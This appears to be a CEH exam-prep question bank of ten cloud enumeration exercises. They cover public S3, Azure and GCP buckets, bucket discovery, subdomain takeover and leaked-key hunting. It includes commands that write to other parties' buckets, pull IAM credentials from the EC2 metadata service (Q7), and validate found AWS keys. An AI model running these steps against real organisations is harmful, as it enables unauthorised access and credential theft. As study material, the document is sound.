# Question Bank — Cloud (10 questions)

> Cloud enumeration. Most CEH cloud Qs are "find the open S3 bucket, read the flag file".

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Check if an S3 bucket named `acme-backups` is public

**Category:** S3 enum | **Tools:** [aws cli](../../tools/aws-cli.md)

**Steps:**
1. `aws s3 ls s3://acme-backups --no-sign-request` ← [why --no-sign-request](../../tools/aws-cli.md#unauthenticated)
2. If it lists, it's world-readable.
3. Also try `curl -s https://acme-backups.s3.amazonaws.com/` — returns XML list if open.

**Answer format:** Yes/No, or a file name from the listing.

**Gotcha:** `--no-sign-request` is critical — without it, aws cli will complain about missing credentials before even trying.

---

### Q2 🟢 — List all objects inside the public bucket `acme-backups`

**Category:** S3 enum | **Tools:** [aws cli](../../tools/aws-cli.md)

**Steps:**
1. `aws s3 ls s3://acme-backups --recursive --no-sign-request`
2. Count with `| wc -l`.

**Answer format:** integer, or a specific filename.

---

### Q3 🟢 — Download `flag.txt` from `acme-backups`

**Category:** S3 download | **Tools:** [aws cli](../../tools/aws-cli.md)

**Steps:**
1. `aws s3 cp s3://acme-backups/flag.txt ./flag.txt --no-sign-request`
2. `cat flag.txt`

**Answer format:** the file's contents.

**Gotcha:** if `cp` fails with 403 but `ls` worked, the bucket has LIST but not GET — try each file individually, some may be readable.

---

### Q4 🟡 — Is the bucket `acme-uploads` writable by anyone?

**Category:** S3 misconfig | **Tools:** [aws cli](../../tools/aws-cli.md)

**Steps:**
1. `echo test > pwn.txt`
2. `aws s3 cp pwn.txt s3://acme-uploads/pwn.txt --no-sign-request`
3. If it succeeds -> writable. Clean up: `aws s3 rm s3://acme-uploads/pwn.txt --no-sign-request`.

**Answer format:** Yes / No.

**Gotcha:** writable + readable by unauth = classic subdomain-takeover / supply-chain scenario. Note it even if the Q only asked about readability.

---

### Q5 🟡 — Brute-discover S3 buckets for the org `acme`

**Category:** Bucket discovery | **Tools:** [cloud_enum](../../tools/cloud_enum.md), [s3scanner](../../tools/s3scanner.md)

**Steps:**
1. `cloud_enum -k acme -k acme-corp -k acme-prod` ← covers AWS+Azure+GCP
2. Or: `s3scanner scan --bucket-file buckets.txt`
3. Or manual: try `https://acme-<word>.s3.amazonaws.com/` with wordlist.

**Answer format:** bucket name(s).

---

### Q6 🟡 — Enumerate an Azure blob storage container at `acmedata`

**Category:** Azure blob | **Tools:** `curl`, [cloud_enum](../../tools/cloud_enum.md)

**Steps:**
1. Test the account exists: `curl -sI https://acmedata.blob.core.windows.net/`
2. List a container: `curl -s "https://acmedata.blob.core.windows.net/<container>?restype=container&comp=list"`
3. Brute common container names: `backup`, `data`, `public`, `images`, `uploads`.

**Answer format:** container name or blob filename.

**Gotcha:** Azure uses `blob.core.windows.net`; containers are the directory layer, blobs are files. You need the container name before you can list blobs.

---

### Q7 🟡 — Query the AWS instance metadata service from a compromised EC2

**Category:** IMDS abuse | **Tools:** `curl`

**Steps:**
1. IMDSv1:
   ```bash
   curl http://169.254.169.254/latest/meta-data/
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
   ```
2. IMDSv2 (token required):
   ```bash
   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```

**Answer format:** the role name, or the `AccessKeyId` / `SecretAccessKey` / `Token` JSON.

**Gotcha:** 169.254.169.254 only works FROM the EC2 instance (or via SSRF). CEH scenarios usually give you an SSRF entry point.

---

### Q8 🔴 — Find a subdomain takeover via dangling CNAME for acme.com

**Category:** Takeover | **Tools:** `dig`, `curl`

**Steps:**
1. Enumerate subs (sublist3r/amass/ffuf).
2. For each: `dig +short <sub>.acme.com CNAME`
3. Flag ones pointing to unclaimed cloud hosts:
   - `*.s3.amazonaws.com` (NoSuchBucket)
   - `*.azurewebsites.net` / `*.cloudapp.net`
   - `*.github.io` (404 Not Found)
   - `*.herokuapp.com`
4. Confirm: `curl -sI https://<sub>.acme.com` — if response is the cloud provider's "not claimed" error, it's vulnerable.

**Answer format:** the vulnerable subdomain + takeover target.

**Gotcha:** "dangling" = CNAME still exists, but the target resource is gone. The fingerprint in the error body is how you confirm.

---

### Q9 🟡 — Find leaked AWS keys in a Git repo / source dump

**Category:** Secrets leak | **Tools:** `gitleaks`, `grep`, [trufflehog](../../tools/trufflehog.md)

**Steps:**
1. `gitleaks detect --source . -v`
2. Or regex sweep:
   ```bash
   grep -rnE "AKIA[0-9A-Z]{16}" .
   grep -rnE "aws_secret_access_key" .
   ```
3. Validate with `aws sts get-caller-identity` using the found key.

**Answer format:** the `AKIA...` access key ID (20 chars).

**Gotcha:** access keys start `AKIA` (user) or `ASIA` (temp session). Secret keys are 40 base64-ish chars — no fixed prefix, needs context.

---

### Q10 🔴 — Enumerate a public GCP storage bucket

**Category:** GCP bucket | **Tools:** `gsutil`, `curl`

**Steps:**
1. Direct URL: `curl -s https://storage.googleapis.com/acme-data/`
2. Or: `gsutil ls gs://acme-data` (needs `gcloud auth` or `-o Credentials:gs_oauth2_refresh_token=`)
3. Anonymous list endpoint:
   ```bash
   curl -s "https://www.googleapis.com/storage/v1/b/acme-data/o"
   ```

**Answer format:** object name, or bucket listing count.

**Gotcha:** GCP buckets return JSON, not XML like S3. Pipe to `jq '.items[].name'`.

---

## 📌 Quick links

- [aws cli reference](../../tools/aws-cli.md)
- [cloud_enum reference](../../tools/cloud_enum.md)
- [s3scanner reference](../../tools/s3scanner.md)
- [17-cloud README](../../17-cloud/README.md)
